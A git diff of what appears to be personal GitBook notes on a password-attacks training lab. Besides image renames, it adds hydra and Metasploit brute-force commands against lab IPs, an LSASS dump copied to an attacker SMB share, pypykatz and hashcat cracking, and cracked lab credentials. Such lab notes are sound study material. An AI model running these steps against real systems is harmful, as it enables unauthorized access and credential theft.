@@ -30,12 +30,12 @@
 
     <figure><img src=".gitbook/assets/image (14) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * /etc/passwd
 *
 
-    <figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -43,7 +43,7 @@
 
 #### Windows
 
-<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * LSASS
 * SAM database
@@ -65,19 +65,59 @@ Find the user for the **WinRM** service and crack their password. Then, when you
 
 <figure><img src=".gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
 
+`evil-winrm -u john -i 10.129.218.11 -p november`
 
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 Find the user for the **SSH** service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
 
+`hydra -L username.list -P password.list ssh://10.129.238.248`
 
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+`ssh dennis@10.129.238.248`
+
+* password & login
+* `cd Desktop`
+* `type flag.txt`
 
 Find the user for the **RDP** service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
 
+`hydra -L username.list -P password.list rdp://10.129.238.248`
 
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+Reminna to login
+
+<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 Find the user for the **SMB** service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
 
+* hydra could do it, but cant handle SMBv3 replies
 
+`msfconsole -q`
+
+`use auxiliary/scanner/smb/smb_login`
+
+`options`
+
+`set user_file username.list`
+
+`set pass_file password.list`
+
+`set rhosts 10.129.238.248`
+
+`run`
+
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+`smbclient -U cassie -L \10.129.238.248`
+
+`smbclient -U cassie \\\\10.129.238.248\\SHARENAME`
+
+_flag is right here_
 
 ### Password Mutations
 
@@ -237,33 +277,33 @@ Then we can crack the NT Hash with Hashcat
 * Task manager
   *   LSASS -> right-click -> Create dump file
 
-      <figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-      <figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 *   File transfer to our attack Linux machine from Windows RDP...
 
     * sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/zihuatanejo
 
-    <figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
     * `move lsass.dmp \\10.10.15.83\CompData`
 
-    <figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
     * Check in linux terminal -> ls
 * `pypykatz lsa minidump /home/zihuatanejo/lsass.DMP`
 
-<figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Copy NT hash (31f87811133bc6aaa75a536e77f64314) to hash.txt file
 * sudo hashcat -m 1000 hash.txt ./Desktop/rockyou.txt
   *
 
-      <figure><img src=".gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src=".gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Attacking AD & NTDS.dit
 
@@ -353,7 +393,7 @@ python3 laZagne.py browsers
     * hashcat --force password.list -r custom.rule --stdout | sort -u > mutated.list
     * hydra -l kira -P mutated.list ssh://10.129.115.79 -t 64
 
-    <figure><img src=".gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src=".gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
     \-
 * SSH to kira
@@ -363,7 +403,7 @@ python3 laZagne.py browsers
 
     * cat _.bash-history_
 
-    <figure><img src=".gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src=".gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
     * we have to upload the firefox\_decrypt tool into kira box
       * after running it, we should obtain Willy PW from browser history...
@@ -375,7 +415,7 @@ python3 laZagne.py browsers
 
       * option 2
 
-      <figure><img src=".gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src=".gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Passwd, Shadow & Opasswd
 
@@ -725,9 +765,38 @@ PW: **L0vey0u1!**
 
 **Examine the first target and submit the root password as the answer.**
 
-* **nmap 10.129.104.203 -sVC**
-  * 21 FTP
-  * 22 SSH
+`nmap 10.129.104.203 -sVC`
+
+* 21 FTP
+* 22 SSH
+
+`hydra -L username.list -P password.list ssh://10.129.189.211`
+
+`hydra -L username.list -P password.list ftp://10.129.189.211`
+
+mike:7777777
+
+`ftp 10.129.189.211`
+
+<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+`chmod u+x id_rsa`
+
+`sudo ssh -i id_rsa mike@10.129.189.211`
+
+passphrase: same as password
+
+* we could obtain it with ssh2john -> get hash from rsa -> decrypt hash -> 7777777
+
+<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+
+
+`cat ~/.bash_history`
+
+<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
 ### PW Attacks lab - MEDIUM
 
